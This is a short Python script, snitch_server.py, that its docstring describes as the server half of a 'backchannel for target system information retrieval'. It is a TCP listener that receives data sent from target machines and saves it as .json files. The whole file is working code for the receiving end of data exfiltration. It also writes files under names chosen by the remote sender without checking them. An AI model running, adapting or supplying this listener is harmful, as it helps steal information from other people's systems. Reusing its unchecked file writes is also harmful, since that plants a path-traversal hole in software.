#!/usr/bin/env python3
"""
This modules serves as the server part of our simple backchannel for target system information retrieval

File name: snitch_server.py
Author: Konstantinos Christos Liosis
Date created: 13/6/2018
Python Version: 3.6.0

Example execution:
$ python snitch_server.py -server 192.168.1.1 -port 1337
"""
import socket
import argparse


def receive(HOST=None, PORT=1337):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(10000)
    print('Server listening on port {}...'.format(PORT))

    while True:
        conn, _ = s.accept()

        in_data = conn.recv(1024)

        if 'DONE' == str(in_data.decode('utf-8')):
            break

        if '.json' in str(in_data.decode('utf-8')):
            out_file = open(str(in_data.decode('utf-8')).split('.json')[0] + '.json', 'wb')
            in_data = bytearray(str(in_data.decode('utf-8')).split('.json')[1], encoding='utf-8')

        if 'out_file' in vars():
            while len(in_data):
                print(str(in_data.decode('utf-8')))
                out_file.write(in_data)
                in_data = conn.recv(1024)
            out_file.close()

    s.close()

    return None


if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    # port
    parser.add_argument('-port', help='Port')
    # server
    parser.add_argument('-server', help='Server')

    args = parser.parse_args()

    if not args.port:
        args.port = input('Define port: ')

    if not args.server:
        args.server = input('Define server address: ')

    receive(HOST=args.server, PORT=int(args.port))

    exit()
